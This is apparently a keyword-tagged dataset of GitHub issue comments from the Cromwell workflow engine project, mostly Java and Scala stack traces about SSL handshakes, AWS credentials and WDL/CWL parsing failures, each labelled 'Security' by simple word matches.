sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.securi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7635,secur,security,7635,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEv",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:1237,Validat,Validated,1237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174,1,['Validat'],['Validated']
Security,"ader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 more. 2019-07-02 19:16:37,991 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowManagerActor WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3 is in a terminal state: WorkflowFailedState",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:16343,validat,validateCredential,16343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['validat'],['validateCredential']
Security,"akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(Http",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8004,secur,security,8004,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,ala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$7(WdlDraft2WomScatterNodeMaker.scala:52); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:51); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:15); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode$(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$ops$$anon$1.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.buildNode$1(WdlDraft2WomGraphMaker.scala:90); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$3(WdlDraft2WomGraphMaker.scala:38); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.foldFunction$1(WdlDraft2WomGraphMaker.scala:37); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$14(WdlDraft2WomGraphMaker.scala:98); 	at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); 	at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); 	at scala.collection.immutable.List.foldLeft(List.scala:86); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:98); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:5382,validat,validation,5382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['validat'],['validation']
Security,"alization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl failed with Traceback (most recent call last):; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:256:1: checking field `steps`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:257:3: checking object `../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl#alignment_to_rec`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:289:3: Field `run` contains undefined reference to `file:///var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/steps/alignment_to_rec.cwl`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574:1825,validat,validate,1825,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574,1,['validat'],['validate']
Security,"alizeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl failed with Traceback (most recent call last):; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/Users/jgentry/projects/cromwell/server/target/scala-2.12/cromwell-36-82fd70f-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:256:1: checking field `steps`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:257:3: checking object `../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl#alignment_to_rec`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:289:3: Field `run` contains undefined reference to `file:///var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/steps/alignment_to_rec.cwl`; ../../../../var/folders/bs/wc6g67396rg8qnfj9qhvbvfsg7jhsw/T/cwl_temp_dir_822121598177295457/cwl_temp_file_7193cfe7-2342-48cc-8d7c-bf7d3434c57f.cwl:290:3: check",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574:1834,Validat,ValidationException,1834,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-429454574,1,['Validat'],['ValidationException']
Security,"ant this to plug into AWS"" or ""I want this to plug into Kubernetes,"" etc. The backends for HPC are going to be good to go with just a SLURM or SGE backend, and then commands to load and run/exec a Singularity container. When the time comes and Singularity supports services, then we can start to develop (I think) the singularity backend configuration for cromwell, with clean commands to get statuses, start and stop, and otherwise integrate into the software. You guys seem pretty busy, so likely your best bet would be to just wait, because the community is going in that direction anyway. The other representation is to rethink this. An approach that I like is to move away from micro managing the workflow / software, and to set requirements for the data. If you set standard formats (meaning everything from the organization of files down to the headers of a data file) on the data itself, then the software gets built around that. A researcher can have confidence that the data he is collecting will work with software because it's validated to the format. The developers can have confidence their tools will work with data because of that same format. A new graduate student knows how to develop a new tool because there are nicely defined rules. A good example is to look at the BIDS (brain imaging data structure) that (has several file formats under it) but it revolutionizing how brain imaging analysis is done. (e.g, take a look at [https://www.openneuro.org](https://www.openneuro.org). # Development of my Thinking; Finally, I want to share how I came to the thinking above. Here are the steps that I've taken in the last few weeks, and resulting thoughts from them. I started with this issue board actually, and a general goal to ""Add Singularity to Cromwell."" Ok. ### Question 1: How do I develop Cromwell?; It first was hard for me to know where to start to develop Cromwell, because the docs just went into how to compile it on a host. So it made sense to make it easy for the deve",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:6889,validat,validated,6889,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['validat'],['validated']
Security,"arget/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#main, file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#touch.cwl]; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:255); 	at cats.data.Validated.valueOr(Validated.scala:48); 	at cromwell.CromwellEntryPoint$.validOrFailSubmission(CromwellEntryPoint.scala:255); 	at cromwell.CromwellEntryPoint$.validateRunArguments(CromwellEntryPoint.scala:251); 	at cromwell.CromwellEntryPoint$.runSi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2854,access,access,2854,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1(EcmaScriptUtil.scala:107); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1$adapted(EcmaScriptUtil.scala:97); 	at cwl.internal.EnhancedRhinoSandbox.eval(EnhancedRhinoSandbox.scala:61); 	at cwl.internal.EcmaScriptUtil$.evalRaw(EcmaScriptUtil.scala:69); 	at cwl.internal.EcmaScriptUtil$.evalStructish(EcmaScriptUtil.scala:97); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:76); 	at cwl.ExpressionEvaluator$.evaluator$1(ExpressionEvaluator.scala:40); 	at cwl.ExpressionEvaluator$.$anonfun$evalExpression$1(ExpressionEvaluator.scala:43); 	at cwl.ExpressionInterpolator$.interpolate(ExpressionInterpolator.scala:140); 	at cwl.ExpressionEvaluator$.evalExpression(ExpressionEvaluator.scala:43); 	at cwl.EvaluateExpression$.$anonfun$script$2(EvaluateExpression.scala:11); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:35); 	at cwl.CommandLineBindingCommandPart.$anonfun$instantiate$5(CwlExpressionCommandPart.scala:79); 	at scala.Option.flatMap(Option.scala:171); 	at cwl.CommandLineBindingCommandPart.instantiate(CwlExpressionCommandPart.scala:78); 	at wom.callable.CommandTaskDefinition.$anonfun$instantiateCommand$3(CommandTaskDefinition.scala:109); 	at scala.collection.immutable.List.flatMap(List.scala:335); 	at wom.callable.CommandTaskDefinition.instantiateCommand(CommandTaskDefinition.scala:108); 	at wom.callable.CommandTaskDefinition.instantiateCommand$(CommandTaskDefinition.scala:97); 	at wom.callable.CallableTaskDefinition.instantiateCommand(CommandTaskDefinition.scala:136); 	at cromwell.backend.wdl.Command$.$anonfun$instantiate$1(Command.scala:32); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:20); 	at cromwell.backend.wdl.Command$.instantiate(Command.scala:31); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:349); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787:4171,validat,validation,4171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787,1,['validat'],['validation']
Security,ationException: 'nioPath' not implemented for SraPath; 	at cromwell.filesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1207,hash,hashing,1207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hashing']
Security,"b7ba-416f-964e-22ab8c7b38e3); 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowManagerActor Successfully started WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2019-07-02 19:16:37,271 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2019-07-02 19:16:37,932 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:1630,validat,validateCredential,1630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"c5a8-4c3a-9356-531b3cf0f2da failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl failed with Traceback (most recent call last):; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:24:1: checking field steps; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:30:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#checker; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:31:5: Field run contains undefined reference to file:///tmp/cwl_temp_dir_2148913290991206234/checker/md5sum_checker.cwl; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:25:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#md5sum; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:26:5: Field run contains undefined 